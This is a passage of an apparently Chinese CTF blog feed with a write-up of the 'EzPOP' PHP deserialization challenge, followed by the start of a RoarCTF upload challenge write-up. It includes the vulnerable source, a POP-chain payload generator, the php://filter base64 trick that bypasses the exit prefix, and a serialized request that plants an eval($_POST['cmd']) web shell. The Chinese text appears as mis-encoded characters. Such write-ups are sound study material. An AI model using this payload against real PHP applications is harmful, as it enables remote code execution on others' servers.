class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$serialize</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'serialize'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$serialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">set</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">,</span> <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">bool</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">writeTimes</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expire'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getExpireTime</span><span class="token punctuation">(</span><span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">getCacheKey</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// åˆ›å»ºå¤±è´¥</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'gzcompress'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">//æ•°æ®å‹ç¼©</span>            <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">gzcompress</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"&lt;?php\n//"</span> <span class="token operator">.</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%012d'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n exit();?>\n"</span> <span class="token operator">.</span> <span class="token variable">$data</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'src'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"uploads/"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h2><p>ååºåˆ—é¢˜ï¼Œçœ‹ä»£ç æ„é€ popé“¾ã€‚</p><h3 id="å‡½æ•°è§£æ"><a href="#å‡½æ•°è§£æ" class="headerlink" title="å‡½æ•°è§£æ"></a>å‡½æ•°è§£æ</h3><ul><li><p><code>array_intersect_key</code> æ¯”è¾ƒé”®åè¿”å›ä¸¤ä¸ªé›†åˆçš„äº¤é›†ï¼Œä»¥ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºä¼˜å…ˆ</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a1</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"red"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"b"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"green"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"c"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a2</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"red"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"c"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"blue"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"d"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"pink"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">array_intersect_key</span><span class="token punctuation">(</span><span class="token variable">$a1</span><span class="token punctuation">,</span> <span class="token variable">$a2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Array ( [a] => red [c] => 123 )</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>array_flip</code> åè½¬é”®å€¼å¯¹</p><pre class="line-numbers language-none"><code class="language-none">$cachedProperties &#x3D; array_flip([    &#39;path&#39;, &#39;dirname&#39;]);var_dump($cachedProperties);&#x2F;&#x2F;array(2) &#123; [&quot;path&quot;]&#x3D;&gt; int(0) [&quot;dirname&quot;]&#x3D;&gt; int(1) &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>ç¬¬ä¸€æ­¥ï¼Œå…ˆæ‰¾å“ªé‡Œèƒ½è¾“å‡ºflagæˆ–æ‰§è¡Œä»£ç çš„åœ°æ–¹ã€‚</p><p>å¾ˆæ˜æ˜¾ï¼Œåœ¨è¿™é‡Œäº†ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-EIS-2019-EzPOP/image-20210817165436129.png"></p><p>å¤§è‡´popé“¾å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">B::set() &lt;- A::save() &lt;- A::__destruct()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åå¾—å…·ä½“æ„é€ äº†</p><p>å…ˆçœ‹è¿™é‡Œï¼š</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-EIS-2019-EzPOP/image-20210817171544413.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcd'</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%012d'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token comment">//000000000000</span><span class="token variable">$expire</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1234'</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'%012d'</span><span class="token punctuation">,</span> <span class="token variable">$expire</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span><span class="token comment">//000000001234</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œåªå…è®¸è¾“å‡ºæ•°å­—ï¼Œæ‰€ä»¥è‚¯å®šæœ‰æ¼æ´ï¼Œç™¾åº¦ä¸€ä¸‹ï¼ŒçœŸæœ‰</p><p><a href="https://www.cnblogs.com/qingwuyou/p/10687463.html">php sprintfå‡½æ•°æ¼æ´</a></p><p>çœ‹äº†ä¸€ä¼šï¼Œå¾—ï¼Œå®é™…ä¸Šè¿™é‡Œå¹¶ä¸æ˜¯ç”¨è¿™ä¸ªæ ¼å¼åŒ–æ¼æ´ï¼Œè€Œæ˜¯ç›´æ¥ç»•è¿‡çš„ã€‚</p><p>å¯ä»¥ä»<code>$filename</code>å…¥æ‰‹</p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨</a></p><blockquote><p>PHPåœ¨è§£ç base64æ—¶ï¼Œé‡åˆ°ä¸åœ¨å…¶ä¸­çš„å­—ç¬¦æ—¶ï¼Œå°†ä¼šè·³è¿‡è¿™äº›å­—ç¬¦ï¼Œä»…å°†åˆæ³•å­—ç¬¦ç»„æˆä¸€ä¸ªæ–°çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç </p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">$filename = 'php://filter/write=convert.base64-decode/resource=shell.php';$data = 'PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTsgPz4=';$add_str = '111';$data = "<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\n<span class="token comment">//" . sprintf('%012d', $expire) . "\n exit();</span><span class="token delimiter important">?></span></span>\n" . $add_str . $data;file_put_contents($filename, $data);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ©ç”¨ä¼ªåè®®ï¼Œåœ¨å†™å…¥çš„æ—¶å€™è¿›è¡Œbase64è§£ç ï¼Œè¿™æ ·å°±æŠŠå‰é¢çš„<strong>æ­»äº¡exit</strong>ç»™è§£ç æ‰äº†ã€‚</p><p>ç„¶åå‘ç°å­—ç¬¦ä¸å¤Ÿï¼Œäºæ˜¯ä¸€ä¸ªä¸€ä¸ªåŠ ï¼ŒåŠ åˆ°3ä¸ªå­—ç¬¦å°±æˆäº†ã€‚</p><p>base64ç¼–ç åçš„å­—ç¬¦ä¸²å­—èŠ‚æ•°éƒ½æ˜¯4çš„å€æ•°ï¼Œè€Œè¡¨ä¸­å­—ç¬¦åªæœ‰[a-zA-z0-9+/]ï¼Œå…¶ä»–å­—ç¬¦æ˜¯ä¸åœ¨ç¼–ç èŒƒå›´å†…çš„</p><p>å†™ä¸ªä»£ç æµ‹è¯•ä¸‹</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$s1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'12'</span><span class="token punctuation">;</span><span class="token variable">$s2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'12=='</span><span class="token punctuation">;</span><span class="token variable">$b1</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$s1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b2</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$s2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$b1</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string single-quoted-string">' '</span> <span class="token operator">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$b2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//OUTPUT:d7 d7</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ˜æ˜¾ï¼Œè§£ç çš„æ—¶å€™ä¸è¶³4çš„å€æ•°ä¼šè¡¥ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$data = "<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\n<span class="token comment">//" . sprintf('%012d', $expire) . "\n exit();</span><span class="token delimiter important">?></span></span>\n"=><span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\n<span class="token comment">//123456789123\n exit();</span><span class="token delimiter important">?></span></span>\n<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä¸ç¬¦åˆbase64ç¼–ç çš„å­—ç¬¦èŒƒå›´å°†è¢«å¿½ç•¥,èƒ½è¢«è§£ç çš„åªæœ‰å¦‚ä¸‹21ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦è¡¥3ä¸ªå­—ç¬¦ã€‚</p><pre class="line-numbers language-none"><code class="language-none">php&#x2F;&#x2F;123456789123exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç„¶åè¿™é‡Œçš„$contentså°±æ˜¯æ”¾webshellçš„åœ°æ–¹ï¼Œè¿™æœ‰ä¸¤ä¸ªé€‰æ‹©ï¼Œä¸€æ˜¯ä»<code>$cleaned</code>å–ï¼Œä¸€æ˜¯ä»<code>$complete</code>é‡Œå–ã€‚æ˜æ˜¾ä»<code>$complete</code>é‡Œå–è¦ç®€å•ç‚¹ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥è®©<code>$cleaned</code>ä¸ºç©ºæˆ–ç©ºæ•°ç»„å³å¯ã€‚</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-EIS-2019-EzPOP/image-20210817221009582.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'MTIzNDU='</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$a = json_encode(['', 'MTIzNDU=']);</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-EIS-2019-EzPOP/image-20210817221607606.png"></p><p>payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$store</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$expire</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">store</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">autosave</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'shell.php'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cache</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">complete</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'MTExUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiSjJOdFpDZGRLVHNnUHo0PQ=='</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'serialize'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'base64_decode'</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data_compress'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expire'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'php://filter/write=convert.base64-decode/resource='</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">ï¼Ÿdata&#x3D;O%3A1%3A%22A%22%3A6%3A%7Bs%3A8%3A%22%00%2A%00store%22%3BO%3A1%3A%22B%22%3A1%3A%7Bs%3A7%3A%22options%22%3Ba%3A4%3A%7Bs%3A9%3A%22serialize%22%3Bs%3A13%3A%22base64_decode%22%3Bs%3A13%3A%22data_compress%22%3Bb%3A0%3Bs%3A6%3A%22expire%22%3Bi%3A1%3Bs%3A6%3A%22prefix%22%3Bs%3A50%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3D%22%3B%7D%7Ds%3A6%3A%22%00%2A%00key%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A9%3A%22%00%2A%00expire%22%3BN%3Bs%3A8%3A%22autosave%22%3Bi%3A0%3Bs%3A5%3A%22cache%22%3Ba%3A0%3A%7B%7Ds%3A8%3A%22complete%22%3Bs%3A60%3A%22MTExUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiSjJOdFpDZGRLVHNnUHo0PQ%3D%3D%22%3B%7D<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="ä¸è§£ä¹‹å¤„"><a href="#ä¸è§£ä¹‹å¤„" class="headerlink" title="ä¸è§£ä¹‹å¤„"></a>ä¸è§£ä¹‹å¤„</h2><p>è¿·æƒ‘çš„æ˜¯ï¼Œè¿™æ ·å°±ä¸æŠ¥é”™</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$data = "<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\n<span class="token comment">//" . sprintf('%012d', $expire) . "\n exit();</span><span class="token delimiter important">?></span></span>\n";file_put_contents($filename, $data);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™æ ·å­—ç¬¦ä¸å¤Ÿä¼šæŠ¥é”™ã€‚</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$data = "<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\n<span class="token comment">//" . sprintf('%012d', $expire) . "\n exit();</span><span class="token delimiter important">?></span></span>\n" . $data;file_put_contents($filename, $data);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è¿™æ ·ä¹ŸæŠ¥é”™</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">$data = "<span class="token php language-php"><span class="token delimiter important">&lt;?</span>php\n<span class="token comment">//" . sprintf('%012d', $expire) . "\n exit();</span><span class="token delimiter important">?></span></span>\n" . $data . '111';file_put_contents($filename, $data);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> PHPä»£ç å®¡è®¡ </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆ·é¢˜ç¬”è®°:[RoarCTF 2019]Simple Upload</title>
      <link href="/p/2343151245.html"/>
      <url>/p/2343151245.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…³é”®å­—:[thinkphp|uniqid|thinkphpä¸Šä¼ ]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Home<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Think<span class="token punctuation">\</span>Controller</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">IndexController</span> <span class="token keyword">extends</span> <span class="token class-name">Controller</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$uploadFile</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$uploadFile</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">".php"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$upload</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified"><span class="token punctuation">\</span>Think<span class="token punctuation">\</span>Upload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// å®ä¾‹åŒ–ä¸Šä¼ ç±»</span>        <span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">maxSize</span>  <span class="token operator">=</span> <span class="token number">4096</span> <span class="token punctuation">;</span><span class="token comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ å¤§å°</span>        <span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">allowExts</span>  <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'gif'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'png'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'jpeg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ ç±»å‹</span>        <span class="token variable">$upload</span><span class="token operator">-></span><span class="token property">rootPath</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'./Public/Uploads/'</span><span class="token punctuation">;</span><span class="token comment">// è®¾ç½®é™„ä»¶ä¸Šä¼ ç›®å½•</span>        <span class="token variable">$upload</span><span class="token operator">-></span><span 